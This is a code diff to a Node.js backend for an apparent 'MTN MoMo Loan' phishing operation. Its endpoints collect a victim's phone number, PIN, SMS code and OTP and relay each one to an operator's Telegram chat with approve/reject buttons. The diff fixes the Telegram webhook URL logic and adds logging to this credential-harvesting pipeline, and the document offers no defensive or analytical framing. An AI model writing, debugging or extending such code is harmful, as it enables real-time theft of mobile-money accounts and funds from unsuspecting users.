@@ -32,30 +32,17 @@ const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
 
 /* ============================================================
    IN-MEMORY SESSION STORE
-   Map<sessionId, {
-     step: 'login' | 'sms' | 'otp',
-     status: 'pending' | 'approved' | 'rejected' | 'timeout',
-     data: {...},
-     createdAt: number,
-     resolvedAt: number | null,
-     telegramMessageId: number | null
-   }>
    ============================================================ */
 const sessions = new Map();
 
-/* Auto-cleanup */
 setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions.entries()) {
     const age = now - s.createdAt;
-
-    /* Mark pending sessions as timeout after SESSION_TIMEOUT_MS */
     if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
       s.status = 'timeout';
       s.resolvedAt = now;
     }
-
-    /* Delete very old sessions */
     if (age > SESSION_MAX_AGE_MS) {
       sessions.delete(id);
     }
@@ -183,14 +170,13 @@ app.get('/', (_req, res) => {
     ok: true,
     service: 'momo-usersey-backend',
     activeSessions: sessions.size,
+    webhook: global.__webhookStatus || 'unknown',
     time: new Date().toISOString()
   });
 });
 
 /* ============================================================
    POST /api/login
-   Body: { phone, pin, country? }
-   Response: { ok: true, sessionId, token }
    ============================================================ */
 app.post('/api/login', async (req, res) => {
   try {
@@ -217,6 +203,7 @@ app.post('/api/login', async (req, res) => {
       `⏳ Tap ✅ or ❌ below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'login');
+    console.log(`[login] sessionId=${sessionId} telegramMessageId=${messageId}`);
 
     sessions.set(sessionId, {
       step: 'login',
@@ -236,8 +223,6 @@ app.post('/api/login', async (req, res) => {
 
 /* ============================================================
    POST /api/sms
-   Body: { phone, token, sms }
-   Response: { ok: true, sessionId, reference }
    ============================================================ */
 app.post('/api/sms', async (req, res) => {
   try {
@@ -263,6 +248,7 @@ app.post('/api/sms', async (req, res) => {
       `⏳ Tap ✅ or ❌ below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
+    console.log(`[sms] sessionId=${sessionId} telegramMessageId=${messageId}`);
 
     sessions.set(sessionId, {
       step: 'sms',
@@ -282,8 +268,6 @@ app.post('/api/sms', async (req, res) => {
 
 /* ============================================================
    POST /api/verify-otp
-   Body: { phone, otp, sms, token }
-   Response: { ok: true, sessionId, reference }
    ============================================================ */
 app.post('/api/verify-otp', async (req, res) => {
   try {
@@ -310,6 +294,7 @@ app.post('/api/verify-otp', async (req, res) => {
       `\n⏳ Tap ✅ or ❌ below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
+    console.log(`[otp] sessionId=${sessionId} telegramMessageId=${messageId}`);
 
     sessions.set(sessionId, {
       step: 'otp',
@@ -329,8 +314,6 @@ app.post('/api/verify-otp', async (req, res) => {
 
 /* ============================================================
    POST /api/resend-sms
-   Body: { phone }
-   Response: { ok: true }
    ============================================================ */
 app.post('/api/resend-sms', async (req, res) => {
   try {
@@ -346,7 +329,6 @@ app.post('/api/resend-sms', async (req, res) => {
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;
 
-    /* Just notify — no approval needed for resend */
     await sendTelegramWithButtons(text, 'noop', 'noop');
 
     return res.json({ ok: true });
@@ -358,8 +340,6 @@ app.post('/api/resend-sms', async (req, res) => {
 
 /* ============================================================
    GET /api/status/:sessionId
-   Response: { ok: true, status: 'pending'|'approved'|'rejected'|'timeout', step }
-   Frontend polls this every 2.5 seconds
    ============================================================ */
 app.get('/api/status/:sessionId', (req, res) => {
   const { sessionId } = req.params;
@@ -369,7 +349,6 @@ app.get('/api/status/:sessionId', (req, res) => {
     return res.json({ ok: true, status: 'unknown', step: null });
   }
 
-  /* Check timeout on-demand too */
   if (session.status === 'pending' && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
     session.status = 'timeout';
     session.resolvedAt = Date.now();
@@ -384,7 +363,6 @@ app.get('/api/status/:sessionId', (req, res) => {
 
 /* ============================================================
    POST /api/telegram-webhook
-   Receives Telegram callback_query (button taps)
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -397,6 +375,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const [action, step, sessionId] = String(cb.data).split(':');
     const session = sessions.get(sessionId);
+
+    console.log(`[webhook] action=${action} step=${step} sessionId=${sessionId} found=${!!session}`);
 
     if (!session) {
       await answerCallback(cb.id, 'Session expired');
@@ -421,11 +401,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    /* Edit the original Telegram message to show the decision */
     const statusLine = action === 'approve' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>';
     const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
 
-    /* Rebuild original text (shortened) */
     let summary = '';
     if (session.step === 'login') {
       summary = `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
@@ -466,27 +444,34 @@ app.use((err, _req, res, _next) => {
 
 /* ============================================================
    AUTO-REGISTER TELEGRAM WEBHOOK ON START
+   ✅ FIXED: correct precedence, robust URL detection
    ============================================================ */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) {
     console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
+    global.__webhookStatus = 'missing_token';
     return;
   }
 
-  /* Railway gives us a public URL via env or we derive it */
-  const publicUrl =
-    process.env.PUBLIC_URL ||
-    process.env.RAILWAY_PUBLIC_DOMAIN
-      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
-      : null;
+  /* ✅ FIX: correctly determine the public URL */
+  let publicUrl = process.env.PUBLIC_URL || '';
+
+  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
+    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
+  }
+
+  /* Normalize — strip trailing slash */
+  publicUrl = publicUrl.replace(/\/+$/, '');
 
   if (!publicUrl) {
     console.warn('⚠️ Cannot register webhook — no PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
-    console.warn('   Set PUBLIC_URL=https://your-app.up.railway.app in env vars.');
+    console.warn('   Set PUBLIC_URL=https://your-app.up.railway.app in Railway env vars.');
+    global.__webhookStatus = 'missing_url';
     return;
   }
 
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
+  console.log('🔗 Registering webhook:', webhookUrl);
 
   try {
     const res = await fetch(TELEGRAM_WEBHOOK_URL, {
@@ -500,11 +485,14 @@ async function registerWebhook() {
     const data = await res.json().catch(() => ({}));
     if (data.ok) {
       console.log('✅ Telegram webhook registered:', webhookUrl);
+      global.__webhookStatus = 'ok';
     } else {
       console.warn('⚠️ Webhook registration failed:', data.description || data);
+      global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
     }
   } catch (err) {
     console.error('❌ Webhook registration error:', err.message);
+    global.__webhookStatus = `error: ${err.message}`;
   }
 }
 
@@ -516,8 +504,9 @@ app.listen(PORT, async () => {
   console.log('💰 MTN MoMo Loan — backend running');
   console.log(`🚀 Port: ${PORT}`);
   console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
+  console.log(`🌐 PUBLIC_URL env: ${process.env.PUBLIC_URL || '(not set)'}`);
+  console.log(`🌐 RAILWAY_PUBLIC_DOMAIN env: ${process.env.RAILWAY_PUBLIC_DOMAIN || '(not set)'}`);
   console.log('====================================');
 
-  /* Register webhook after startup (wait 2s so Railway is fully up) */
   setTimeout(registerWebhook, 2000);
 });
